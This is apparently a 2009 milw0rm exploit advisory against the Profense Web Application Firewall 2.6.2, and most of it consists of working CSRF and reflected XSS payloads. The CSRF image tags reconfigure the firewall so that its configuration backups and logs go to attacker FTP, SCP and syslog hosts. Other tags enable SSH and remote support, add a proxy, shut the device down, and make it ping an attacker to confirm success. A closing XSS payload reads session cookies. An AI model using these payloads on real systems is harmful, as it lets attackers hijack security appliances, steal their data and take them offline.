@@ -1,0 +1,36 @@
+Written By Michael Brooks
+Special thanks to str0ke!
+
+Affects: Profense Web Application Firewall XSRF and XSS
+Version: 2.6.2
+download http://www.armorlogic.com/download_software.html
+
+"Defenses against all OWASP Top Ten vulnerabilities"
+ Too bad it doesn't defend its self against all of these vulnerabilities....
+
+
+Chaning configuration:
+DNS, SMTP,  NTP servers.
+Set a (malcious) remote FTP server or SCP server to backup (steal)
+configuration files.   This could be used to steal the configuraitons.
+Set a remote syslog server to steal the logs
+Enable SSH
+Enable SNMP
+<img src=https://10.1.1.199:2000/ajax.html?hostname=profense.mydomain.com&gateway=10.1.1.1&dns=10.1.1.1&smtp=10.1.1.1&max_src_conn=100&max_src_conn_rate_num=100&max_src_conn_rate_sec=10&blacklist_exp=3600&ntp=ntp.hacked.com&timezone=CET&syslog=syslog.hacked.com&syslog_ext_l=4&snmp_public=public&snmp_location=&contact=admin%40mydomain.com&ftp_server=ftp.hacked.com&ftp_port=21&ftp_login=user&ftp_passwd=password&ftp_remote_dir=%2Fhijacked_log&scp_server=scp.hacked.com&scp_port=22&scp_login=admin&scp_remote_dir=%2Fhijacked_log&ftp_auto_on=on&scp_auto_on=on&ssh_on=on&remote_support_on=on&action=configuration&do=save>
+Apply new configurations:
+<img src=https://10.1.1.199:2000/ajax.html?action=restart&do=core>
+
+Add a proxy:
+<img src=https://10.1.1.199:2000/ajax.html?vhost_proto=http&vhost=vhost.com&vhost_port=80&rhost_proto=http&rhost=10.1.1.1&rhost_port=80&mode_pass=on&xmle=on&enable_file_upload=on&static_passthrough=on&action=add&do=save>
+
+Turn off the Proface machine:
+<img src=https://10.1.1.199:2000/ajax.html?action=shutdown>
+
+Force the Proface server to ping:
+<img src=https://10.1.1.199:2000/ajax.html?action=ping&ip=10.1.1.1>
+Could be used to nofiy the attacker that the attack succeeded.
+
+reflective xss:
+https://10.1.1.199:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<script>alert(document.cookie)</script>
+
+# milw0rm.com [2009-01-29]
